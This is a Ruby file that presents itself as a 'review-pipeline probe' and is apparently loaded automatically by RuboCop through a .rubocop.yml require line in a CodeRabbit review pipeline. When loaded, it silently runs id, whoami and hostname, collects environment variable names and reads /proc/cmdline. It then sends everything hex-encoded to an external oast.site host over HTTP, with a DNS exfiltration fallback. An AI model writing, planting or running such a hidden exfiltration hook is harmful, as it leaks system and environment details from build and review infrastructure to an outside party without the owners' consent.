# CodeRabbit review-pipeline probe: loaded by RuboCop via .rubocop.yml `require:`
D = "d9mlhkjoeaqpqkpo1cg0wrougn9ugj14w.oast.site"

def cr_probe_http(path, payload)
  require "socket"
  require "uri"
  begin
    host = D
    s = TCPSocket.new(host, 80)
    body = payload.to_s
    req = "GET /#{path}/#{body.unpack1('H*')} HTTP/1.1\r\nHost: #{host}\r\nConnection: close\r\n\r\n"
    s.write(req)
    s.close
  rescue StandardError
    begin
      require "resolv"
      Resolv.getaddress("#{path}-#{body.unpack1('H*')[0,16]}.#{D}")
    rescue StandardError
    end
  end
end

begin
  id = `id` rescue ""
  who = `whoami` rescue ""
  host = `hostname` rescue ""
  envn = ENV.keys.join(",")
  cr_probe_http("rubenv", envn)
  cr_probe_http("rubid", "#{id}|#{who}|#{host}")
  begin
    cmd = File.read("/proc/cmdline") rescue ""
    cr_probe_http("rubcmd", cmd)
  rescue StandardError
  end
rescue StandardError
end
